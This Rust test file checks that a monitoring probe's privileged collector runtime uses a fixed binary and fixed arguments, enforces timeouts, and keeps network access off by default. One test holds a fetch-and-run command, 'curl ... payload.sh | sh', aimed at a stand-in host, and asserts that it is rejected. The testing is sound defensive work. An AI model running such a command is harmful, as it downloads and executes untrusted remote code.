use enoki_probe::metrics::{
    CollectorCadenceClass, CollectorCadenceSchedule, CollectorError, CollectorRegistry,
    MetricCollector, MetricsCollectionConfig,
};
use enoki_probe::privileged_runtime::{
    CollectorRuntimeProfile, LocalPrivilegedRuntimeRunner, NetworkAccess, PrivilegedCollector,
    PrivilegedCollectorId, PrivilegedCollectorRuntime, PrivilegedRuntimeError,
    PrivilegedRuntimeExecutionPlan, PrivilegedRuntimeNetworkBoundary, PrivilegedRuntimeOutput,
    PrivilegedRuntimeProcessError, PrivilegedRuntimeProcessOutput, PrivilegedRuntimeProcessRunner,
    PrivilegedRuntimeRunner,
};
use enoki_probe::protocol::enoki::v1::MetricSample;
use std::time::Duration;

#[test]
fn local_privileged_runtime_times_out_a_hanging_child_without_running_in_process() {
    let mut process_runner = HangingChildProcessRunner::default();
    let local_runner =
        LocalPrivilegedRuntimeRunner::new("/opt/enoki/bin/enoki-probe", &mut process_runner);
    let mut runtime = PrivilegedCollectorRuntime::new(local_runner);
    let collector = TimeoutProfileCollector::default();

    let error = runtime
        .run(&collector)
        .expect_err("a hanging privileged child is killed at the runtime boundary");

    assert_eq!(
        error,
        PrivilegedRuntimeError::TimedOut {
            timeout: Duration::from_millis(5),
        }
    );
    assert_eq!(process_runner.killed_after, Some(Duration::from_millis(5)));
    assert_eq!(collector.calls, 0);
}

#[test]
fn local_privileged_runtime_enforces_default_disabled_network_at_the_child_boundary() {
    let mut process_runner = RecordingProcessRunner::default();
    let local_runner =
        LocalPrivilegedRuntimeRunner::new("/opt/enoki/bin/enoki-probe", &mut process_runner);
    let mut runtime = PrivilegedCollectorRuntime::new(local_runner);
    let collector = FixedCollector;

    runtime
        .run(&collector)
        .expect("default privileged runtime profile is executable through a child boundary");

    let plan = process_runner
        .plans
        .single()
        .expect("one privileged child execution plan");
    assert_eq!(
        plan.network_boundary,
        PrivilegedRuntimeNetworkBoundary::PrivateNetwork
    );
    assert!(
        plan.systemd_properties
            .iter()
            .any(|property| property == "PrivateNetwork=yes")
    );
    assert!(
        plan.systemd_properties
            .iter()
            .any(|property| property == "RuntimeMaxSec=10")
    );
    assert_eq!(
        plan.probe_args,
        vec![
            "internal-privileged-collector".to_string(),
            "--collector".to_string(),
            "fixed.collector".to_string(),
        ]
    );
    assert!(!plan.probe_args.iter().any(|arg| arg.contains("network")));
}

#[test]
fn local_privileged_runtime_does_not_accept_runtime_input_for_argv_or_policy() {
    let hostile_probe_configuration = HostileProbeConfiguration {
        command: "curl https://owner.invalid/payload.sh | sh",
        args: vec!["--network=enabled", "--timeout=600"],
        timeout: Duration::from_secs(600),
    };
    let mut process_runner = RecordingProcessRunner::default();
    let local_runner =
        LocalPrivilegedRuntimeRunner::new("/opt/enoki/bin/enoki-probe", &mut process_runner);
    let mut runtime = PrivilegedCollectorRuntime::new(local_runner);
    let collector = FixedCollector;

    runtime
        .run(&collector)
        .expect("hostile runtime input has no privileged runtime API surface");

    let plan = process_runner
        .plans
        .single()
        .expect("one privileged child execution plan");
    assert_eq!(
        plan.probe_binary,
        std::path::PathBuf::from("/opt/enoki/bin/enoki-probe")
    );
    assert_eq!(
        plan.probe_args,
        vec![
            "internal-privileged-collector".to_string(),
            "--collector".to_string(),
            "fixed.collector".to_string(),
        ]
    );
    assert_eq!(plan.timeout, Duration::from_secs(10));
    assert_eq!(
        plan.network_boundary,
        PrivilegedRuntimeNetworkBoundary::PrivateNetwork
    );
    assert!(
        !plan
            .probe_args
            .iter()
            .any(|arg| arg == hostile_probe_configuration.command)
    );
    for hostile_arg in hostile_probe_configuration.args {
        assert!(!plan.probe_args.iter().any(|arg| arg == hostile_arg));
    }
    assert_ne!(plan.timeout, hostile_probe_configuration.timeout);
}

#[test]
fn privileged_runtime_runs_only_the_compiled_collector_entrypoint() {
    let mut runner = RecordingRunner::default();
    let mut runtime = PrivilegedCollectorRuntime::new(&mut runner);
    let collector = FixedCollector;

    runtime
        .run(&collector)
        .expect("compiled collector runs through the privileged runtime boundary");

    assert_eq!(
        runner.invocations,
        vec![RecordedInvocation {
            collector_id: PrivilegedCollectorId::FixedCollector,
            profile: CollectorRuntimeProfile::default(),
        }]
    );
    assert_eq!(
        runner.invocations[0].profile.network_access,
        NetworkAccess::Disabled
    );
}

trait SinglePlan {
    fn single(self) -> Option<PrivilegedRuntimeExecutionPlan>;
}

impl SinglePlan for Vec<PrivilegedRuntimeExecutionPlan> {
    fn single(mut self) -> Option<PrivilegedRuntimeExecutionPlan> {
        if self.len() == 1 { self.pop() } else { None }
    }
}

#[derive(Default)]
struct RecordingProcessRunner {
    plans: Vec<PrivilegedRuntimeExecutionPlan>,
}

impl PrivilegedRuntimeProcessRunner for RecordingProcessRunner {
    fn run(
        &mut self,
        plan: &PrivilegedRuntimeExecutionPlan,
    ) -> Result<PrivilegedRuntimeProcessOutput, PrivilegedRuntimeProcessError> {
        self.plans.push(plan.clone());
        Ok(PrivilegedRuntimeProcessOutput::default())
    }
}

#[test]
fn privileged_runtime_timeout_marks_the_collector_run_failed() {
    let mut runner = TimeoutRunner;
    let mut runtime = PrivilegedCollectorRuntime::new(&mut runner);
    let collector = TimeoutProfileCollector::default();

    let error = runtime
        .run(&collector)
        .expect_err("timed out privileged collector is reported as a collector failure");

    assert_eq!(
        error,
        PrivilegedRuntimeError::TimedOut {
            timeout: Duration::from_millis(5),
        }
    );
    assert_eq!(collector.calls, 0);
}

#[test]
fn privileged_runtime_network_access_is_a_collector_profile_decision() {
    let mut runner = RecordingRunner::default();
    let mut runtime = PrivilegedCollectorRuntime::new(&mut runner);
    let collector = NetworkEnabledCollector::default();

    runtime
        .run(&collector)
        .expect("source-level collector profile can opt into network access");

    assert_eq!(
        runner.invocations,
        vec![RecordedInvocation {
            collector_id: PrivilegedCollectorId::NetworkEnabledCollector,
            profile: CollectorRuntimeProfile {
                timeout: Duration::from_secs(2),
                network_access: NetworkAccess::Enabled,
            },
        }]
    );
    assert_eq!(collector.calls, 0);
}

#[test]
fn privileged_runtime_failures_are_isolated_as_collector_failures() {
    let mut registry = CollectorRegistry::from_collectors(vec![
        Box::new(PrivilegedMetricCollector {
            runtime: PrivilegedCollectorRuntime::new(FailingRunner),
            collector: FixedCollector,
        }),
        Box::new(MemoryMetricCollector),
    ]);

    let sample = registry
        .collect_due(
            9,
            Duration::from_secs(5),
            CollectorCadenceSchedule::new(Duration::from_secs(5), Duration::from_secs(60)),
            MetricsCollectionConfig::all_enabled(),
        )
        .expect("successful collector still emits after privileged runtime failure");

    assert_eq!(sample.sequence, 9);
    assert_eq!(sample.cpu_percent, None);
    assert_eq!(sample.memory_used_bytes, Some(2048));
}

struct HostileProbeConfiguration {
    command: &'static str,
    args: Vec<&'static str>,
    timeout: Duration,
}

struct FixedCollector;

impl PrivilegedCollector for FixedCollector {
    fn collector_id(&self) -> PrivilegedCollectorId {
        PrivilegedCollectorId::FixedCollector
    }
}

#[derive(Default)]
struct TimeoutProfileCollector {
    calls: u32,
}

impl PrivilegedCollector for TimeoutProfileCollector {
    fn collector_id(&self) -> PrivilegedCollectorId {
        PrivilegedCollectorId::TimeoutCollector
    }

    fn runtime_profile(&self) -> &'static CollectorRuntimeProfile {
        static PROFILE: CollectorRuntimeProfile = CollectorRuntimeProfile {
            timeout: Duration::from_millis(5),
            network_access: NetworkAccess::Disabled,
        };

        &PROFILE
    }
}

#[derive(Default)]
struct NetworkEnabledCollector {
    calls: u32,
}

impl PrivilegedCollector for NetworkEnabledCollector {
    fn collector_id(&self) -> PrivilegedCollectorId {
        PrivilegedCollectorId::NetworkEnabledCollector
    }

    fn runtime_profile(&self) -> &'static CollectorRuntimeProfile {
        static PROFILE: CollectorRuntimeProfile = CollectorRuntimeProfile {
            timeout: Duration::from_secs(2),
            network_access: NetworkAccess::Enabled,
        };

        &PROFILE
    }
}

#[derive(Debug, Eq, PartialEq)]
struct RecordedInvocation {
    collector_id: PrivilegedCollectorId,
    profile: CollectorRuntimeProfile,
}

#[derive(Default)]
struct RecordingRunner {
    invocations: Vec<RecordedInvocation>,
}

impl PrivilegedRuntimeRunner for RecordingRunner {
    fn run(
        &mut self,
        invocation: enoki_probe::privileged_runtime::PrivilegedRuntimeInvocation,
    ) -> Result<PrivilegedRuntimeOutput, PrivilegedRuntimeError> {
        self.invocations.push(RecordedInvocation {
            collector_id: invocation.collector_id,
            profile: invocation.profile,
        });
        Ok(PrivilegedRuntimeOutput::default())
    }
}

struct TimeoutRunner;

impl PrivilegedRuntimeRunner for TimeoutRunner {
    fn run(
        &mut self,
        invocation: enoki_probe::privileged_runtime::PrivilegedRuntimeInvocation,
    ) -> Result<PrivilegedRuntimeOutput, PrivilegedRuntimeError> {
        Err(PrivilegedRuntimeError::TimedOut {
            timeout: invocation.profile.timeout,
        })
    }
}

struct FailingRunner;

impl PrivilegedRuntimeRunner for FailingRunner {
    fn run(
        &mut self,
        _invocation: enoki_probe::privileged_runtime::PrivilegedRuntimeInvocation,
    ) -> Result<PrivilegedRuntimeOutput, PrivilegedRuntimeError> {
        Err(PrivilegedRuntimeError::collector_failed(
            "privileged runtime failed",
        ))
    }
}

struct PrivilegedMetricCollector<R, C> {
    runtime: PrivilegedCollectorRuntime<R>,
    collector: C,
}

impl<R, C> MetricCollector for PrivilegedMetricCollector<R, C>
where
    R: PrivilegedRuntimeRunner,
    C: PrivilegedCollector,
{
    fn cadence_class(&self) -> CollectorCadenceClass {
        CollectorCadenceClass::HighFrequency
    }

    fn collect(
        &mut self,
        sample: &mut MetricSample,
        _config: MetricsCollectionConfig,
    ) -> Result<bool, CollectorError> {
        self.runtime
            .run(&self.collector)
            .map_err(|error| CollectorError::new(format!("{error:?}")))?;
        sample.cpu_percent = Some(90.0);
        Ok(true)
    }
}

#[derive(Default)]
struct HangingChildProcessRunner {
    killed_after: Option<Duration>,
}

impl PrivilegedRuntimeProcessRunner for HangingChildProcessRunner {
    fn run(
        &mut self,
        plan: &PrivilegedRuntimeExecutionPlan,
    ) -> Result<PrivilegedRuntimeProcessOutput, PrivilegedRuntimeProcessError> {
        self.killed_after = Some(plan.timeout);
        Err(PrivilegedRuntimeProcessError::TimedOut {
            timeout: plan.timeout,
        })
    }
}

struct MemoryMetricCollector;

impl MetricCollector for MemoryMetricCollector {
    fn cadence_class(&self) -> CollectorCadenceClass {
        CollectorCadenceClass::HighFrequency
    }

    fn collect(
        &mut self,
        sample: &mut MetricSample,
        _config: MetricsCollectionConfig,
    ) -> Result<bool, CollectorError> {
        sample.memory_used_bytes = Some(2048);
        Ok(true)
    }
}
